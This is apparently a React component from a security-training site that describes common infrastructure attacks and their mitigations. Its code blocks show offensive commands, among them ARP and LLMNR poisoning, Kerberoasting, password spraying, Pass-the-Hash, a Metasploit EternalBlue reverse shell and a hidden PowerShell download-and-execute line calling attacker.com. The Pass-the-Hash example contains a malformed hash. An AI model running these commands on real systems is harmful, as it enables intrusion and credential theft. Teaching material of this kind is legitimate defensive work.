
import React from 'react';
import { Bug, Shield, Lock, Code } from 'lucide-react';
import SecurityCard from '@/components/SecurityCard';
import CodeExample from '@/components/CodeExample';

const InfraCommonAttacksSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div className="mb-8">
        <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
          <Bug className="text-cybr-primary" />
          Common Infrastructure Attacks
        </h2>
        <p className="mb-4">
          Infrastructure penetration testing focuses on identifying and exploiting vulnerabilities in 
          networking components, servers, endpoints, and authentication systems. The following section 
          covers common attack vectors targeting infrastructure components.
        </p>
      </div>
      
      {/* Network-Level Attacks */}
      <div>
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Shield className="text-cybr-primary h-6 w-6" />
          Network-Level Attacks
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <SecurityCard
            title="Man-in-the-Middle (MitM)"
            description="Attackers position themselves between communicating parties to intercept or manipulate traffic. Can lead to credential theft, session hijacking, and data exfiltration."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="ARP Poisoning"
            description="Technique that manipulates the Address Resolution Protocol to redirect network traffic. Often used as a foundation for other attacks like MitM."
            icon={<Bug className="h-6 w-6" />}
            severity="medium"
          />
          
          <SecurityCard
            title="VLAN Hopping"
            description="Attackers bypass VLAN segmentation to access traffic from other VLANs. Two methods: switch spoofing and double tagging."
            icon={<Bug className="h-6 w-6" />}
            severity="medium"
          />
          
          <SecurityCard
            title="LLMNR/NBT-NS Poisoning"
            description="Exploits Windows name resolution fallback mechanisms to capture authentication credentials on a network."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
        </div>
        
        <div className="mt-8">
          <CodeExample
            language="bash"
            code={`# ARP poisoning with Ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.10/

# LLMNR/NBT-NS poisoning with Responder
sudo responder -I eth0 -wrf

# VLAN hopping recon with Yersinia
yersinia -G`}
            title="Network Attack Commands"
            isVulnerable={true}
          />
        </div>
      </div>
      
      {/* Authentication Attacks */}
      <div>
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Lock className="text-cybr-primary h-6 w-6" />
          Authentication Attacks
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <SecurityCard
            title="Password Spraying"
            description="Low-and-slow attack using a few common passwords against many accounts to avoid lockouts. Particularly effective in Active Directory environments."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="Kerberos Attacks"
            description="Techniques targeting the Kerberos authentication protocol, including Kerberoasting, AS-REP Roasting, and Golden/Silver Ticket attacks."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="Pass-the-Hash"
            description="Attack that allows authentication using password hashes without knowing the actual password. Common in Windows environments."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="Credential Stuffing"
            description="Using previously breached username/password combinations to gain unauthorized access to systems. Exploits password reuse across services."
            icon={<Bug className="h-6 w-6" />}
            severity="medium"
          />
        </div>
        
        <div className="mt-8">
          <CodeExample
            language="powershell"
            code={`# Kerberoasting with PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# Password spraying with Crackmapexec
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2023!' --continue-on-success

# Pass-the-Hash with Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:C430DD5A0E939DC2905B9E943146E9CEB292:administrator@192.168.1.10`}
            title="Authentication Attack Commands"
            isVulnerable={true}
          />
        </div>
      </div>
      
      {/* System-Level Attacks */}
      <div>
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Code className="text-cybr-primary h-6 w-6" />
          System-Level Attacks
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <SecurityCard
            title="Unpatched Vulnerabilities"
            description="Exploitation of known security flaws in operating systems and services that haven't been patched. Common examples include EternalBlue and Log4Shell."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="Misconfigured Services"
            description="Exploiting default settings, overly permissive configurations, or improperly secured services like SMB, SSH, or RDP."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="Local Privilege Escalation"
            description="Techniques to elevate privileges from a standard user to administrator or root, often exploiting vulnerable services, binaries, or configurations."
            icon={<Bug className="h-6 w-6" />}
            severity="high"
          />
          
          <SecurityCard
            title="Living Off The Land"
            description="Using legitimate built-in tools and features for malicious purposes, making detection more difficult as attacker actions blend with normal admin operations."
            icon={<Bug className="h-6 w-6" />}
            severity="medium"
          />
        </div>
        
        <div className="mt-8">
          <CodeExample
            language="bash"
            code={`# Windows EternalBlue exploitation with Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit

# Linux privilege escalation using SUID binary
find / -perm -u=s -type f 2>/dev/null
./vulnerable_suid_binary

# Windows living off the land with PowerShell
PowerShell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"`}
            title="System Attack Commands"
            isVulnerable={true}
          />
        </div>
      </div>
      
      {/* Mitigation Strategies */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6">Mitigation Strategies</h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h4 className="text-xl font-semibold mb-3">Network Security</h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>Implement network segmentation and proper VLAN configuration</li>
              <li>Deploy IDS/IPS systems to detect and prevent attacks</li>
              <li>Use Dynamic ARP Inspection (DAI) to prevent ARP poisoning</li>
              <li>Disable unused services and protocols</li>
              <li>Implement 802.1X for network access control</li>
            </ul>
          </div>
          
          <div>
            <h4 className="text-xl font-semibold mb-3">Authentication Security</h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>Enforce strong password policies</li>
              <li>Implement multi-factor authentication</li>
              <li>Use Protected Users security group for privileged accounts</li>
              <li>Monitor for authentication anomalies</li>
              <li>Implement account lockout policies</li>
            </ul>
          </div>
          
          <div>
            <h4 className="text-xl font-semibold mb-3">System Hardening</h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>Keep systems patched and updated</li>
              <li>Follow the principle of least privilege</li>
              <li>Deploy application whitelisting</li>
              <li>Implement secure boot mechanisms</li>
              <li>Use disk encryption</li>
            </ul>
          </div>
          
          <div>
            <h4 className="text-xl font-semibold mb-3">Monitoring & Response</h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>Implement centralized logging and SIEM solutions</li>
              <li>Deploy endpoint detection and response (EDR) tools</li>
              <li>Conduct regular security assessments</li>
              <li>Develop and practice incident response plans</li>
              <li>Monitor for indicators of compromise</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};

export default InfraCommonAttacksSection;
